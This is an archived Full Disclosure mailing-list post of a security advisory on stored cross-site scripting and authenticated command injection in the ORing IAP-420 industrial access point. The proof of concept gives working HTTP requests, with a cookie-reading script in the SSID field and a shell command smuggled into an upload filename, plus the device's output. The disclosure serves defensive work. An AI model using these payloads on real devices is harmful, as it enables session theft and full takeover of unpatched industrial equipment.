<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="CyberDanube Security Research 20240528-0 | Multiple Vulnerabilities in ORing IAP-420"/>
<meta name="Author" content="Thomas Weber via Fulldisclosure"/>
<title>Full Disclosure: CyberDanube Security Research 20240528-0 | Multiple Vulnerabilities in ORing IAP-420</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="35"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#36">By Date</a>
<a href=""><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="35"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#36">By Thread</a>
<a href=""><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">CyberDanube Security Research 20240528-0 | Multiple Vulnerabilities in ORing IAP-420</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Thomas Weber via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Tue, 28 May 2024 09:53:06 +0000<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">CyberDanube Security Research 20240528-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
              product| ORing IAP-420
   vulnerable version| 2.01e
        fixed version| -
           CVE number| CVE-2024-5410, CVE-2024-5411
               impact| High
             homepage| <a  rel="nofollow" href="https://oringnet.com/">https://oringnet.com/</a>
                found| 2024-01-19
                   by| T. Weber (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. PÃ¶lten
                     |
                     | <a  rel="nofollow" href="https://www.cyberdanube.com">https://www.cyberdanube.com</a>
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
&quot;Founded in 2005, ORing specializes in developing innovative own-branded
products for industrial settings. Over the years, ORing has accumulated
abundant experience in wired and wireless network communications industry. In
line with the commercialization of 5G, ORing has stretched its arm into the
IIoT field, helping customers realize all kinds of IIoT applications such as
smart manufacturing, smart city, and industrial automation. With high product
quality and best customer services in mind, ORing has continued to launch
cutting-edge products catering to customer needs. ORing&apos;s products have been
widely adopted in surveillance, rail transport, industrial automation, power
substations, renewable energy, and marine industries with offices worldwide to
address customer needs in real time.&quot;

Source: <a  rel="nofollow" href="https://oringnet.com/en/about-us/company-profile">https://oringnet.com/en/about-us/company-profile</a>


Vulnerable versions
-------------------------------------------------------------------------------
IAP-420 / 2.01e

Vulnerability overview
-------------------------------------------------------------------------------
1) Stored Cross-Site Scripting (CVE-2024-5410)
A Stored Cross-Site Scripting vulnerability was identified in the web interface
of the device. The SSID of the WiFi can be configured to contain arbitrary
JavaScript code. An attacker can exploit this vulnerability by luring a victim
to visit a malicious website. Furthermore, it is possible to hijack the session
of the attacked user.


2) Authenticated Command Injection (CVE-2024-5411)
The filename parameter of the config file upload is prone to a Command
Injection vulnerability. This vulnerability can only be exploited if a user is
authenticated to the web interface. This way, an attacker can invoke commands
and is able to get full control over the whole device.


Proof of Concept
-------------------------------------------------------------------------------
1) Stored Cross-Site Scripting (CVE-2024-5410)
Stored Cross-Site Scripting can be triggered by placing JavaScript code into
the SSID input field of the web interface as authenticated user. A single
request for injecting the script is shown below:
-------------------------------------------------------------------------------
POST /cgi-bin/wl_set.cgi HTTP/1.1
Host: 192.168.0.1
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 659
Connection: keep-alive
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1

sel_op_mode=client&amp;sel_mssid=0&amp;tf_ssid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;sel_isolation=0&amp;
sel_mssid_isolation=0&amp;sel_auth_mode=0&amp;rb_wep_authmode=0&amp;sel_wep_enc_bits=0&amp;
sel_wep_key_type=0&amp;tf_key1=&amp;tf_key2=&amp;tf_key3=&amp;tf_key4=&amp;rb_wpapsk_authmode=0&amp;
rb_wpapsk_enc=0&amp;tf_wpa_key=&amp;rb_wpa_authmode=0&amp;rb_wpa_enc=0&amp;tf_ip1=&amp;tf_ip2=&amp;
tf_ip3=&amp;tf_ip4=&amp;tf_radius_port=&amp;tf_radius_key=&amp;tf_ip1_1x=&amp;tf_ip2_1x=&amp;
tf_ip3_1x=&amp;tf_ip4_1x=&amp;tf_radius_port_1x=&amp;tf_radius_key_1x=&amp;bt_save=Save&amp;
lang=en&amp;channel=0&amp;isolation=0&amp;mssid_isolation=0&amp;auth_mode=0&amp;wep_authmode=0&amp;
wpapsk_authmode=0&amp;wpa_authmode=0&amp;wpa_enc_type=0&amp;wep_enc_bits=0&amp;wep_key_type=0&amp;
wep_key_index=0&amp;ret_msg=
-------------------------------------------------------------------------------

2) Authenticated Command Injection (CVE-2024-5411)
A command can be injected in the filename of the uploaded config. By sending a
request as shown below, the content of the current directory can be shown:
-------------------------------------------------------------------------------
POST /cgi-bin/admin_config.cgi?todo=upconf HTTP/1.1
Host: 10.69.10.2
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------347087158737672164432057801583
Content-Length: 563
Connection: keep-alive
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1

-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;test.bin;ls${IFS}-la;&quot;


-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name=&quot;bt_upconf&quot;

Upload
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name=&quot;lang&quot;

en
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name=&quot;ret_msg_upconf&quot;


-----------------------------347087158737672164432057801583--
-------------------------------------------------------------------------------
This request is equal to executing &quot;ls -la&quot; on the console of the device.

-------------------------------------------------------------------------------
HTTP/1.0 200 OK
tar: can&apos;t open &apos;/tmp/test.bin&apos;: No such file or directory
drwxr-xr-x    4 root     root         1024 Mar  7 14:36 .
drwxr-xr-x    8 root     root         1024 Jan 30  2024 ..
-rwxr-xr-x    1 root     root        17572 Jan 30  2024 admin_config.cgi
-rwxr-xr-x    1 root     root        17584 Jan 30  2024 admin_default.cgi
-rwxr-xr-x    1 root     root        15984 Jan 30  2024 admin_fwup.cgi
-rwxr-xr-x    1 root     root        12476 Jan 30  2024 admin_password.cgi
-rwxr-xr-x    1 root     root        13164 Jan 30  2024 admin_restart.cgi
-rwxr-xr-x    1 root     root        33336 Jan 30  2024 adv_filters.cgi
-rwxr-xr-x    1 root     root        15032 Jan 30  2024 adv_misc.cgi
-rwxr-xr-x    1 root     root        72168 Jan 30  2024 adv_rstp.cgi
-rwxr-xr-x    1 root     root         6588 Jan 30  2024 backup_unit.cgi
[...]
-------------------------------------------------------------------------------

The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (<a  rel="nofollow" href="https://medusa.cyberdanube.com">https://medusa.cyberdanube.com</a>).


Solution
-------------------------------------------------------------------------------
None

Workaround
-------------------------------------------------------------------------------
None

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends Oring customers to upgrade the firmware to the latest
version available and to restrict network access to the management interface of
the device.


Contact Timeline
-------------------------------------------------------------------------------
2024-02-06: Contacting ORing via support () oringnet com. Automatic holiday reply.
2024-02-19: Asking for an update. No reply.
2024-02-28: Asking for an update. No reply.
2024-03-11: Searched for &quot;cyber security manager&quot; on LinkedIn. Contacted him
            and got the answer, that the content should be sent to
            &quot;support () oringnet com&quot;. Sent the advisory to this address directly.
2024-03-20: Asking for an update. No reply.
2024-04-10: Asking for an update. No reply.
2024-04-30: Including support_us () oringnet com. Asking for an update. Added
            notification about responsible disclosure deadline. No reply.
2024-05-02: Including support_eu () oringnet com. Asking for an update. Added
            notification about responsible disclosure deadline. No reply.
2024-05-27: Sent information that the advisory will be published on 2024-05-28.
2024-05-28: Public release of security advisory.


Web: <a  rel="nofollow" href="https://www.cyberdanube.com">https://www.cyberdanube.com</a>
Twitter: <a  rel="nofollow" href="https://twitter.com/cyberdanube">https://twitter.com/cyberdanube</a>
Mail: research at cyberdanube dot com

EOF T. Weber / @2024
_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a>

</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="35"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#36">By Date</a>
<a href=""><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="35"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#36">By Thread</a>
<a href=""><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>CyberDanube Security Research 20240528-0 | Multiple Vulnerabilities in ORing IAP-420</strong> <em>Thomas Weber via Fulldisclosure (May 29)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

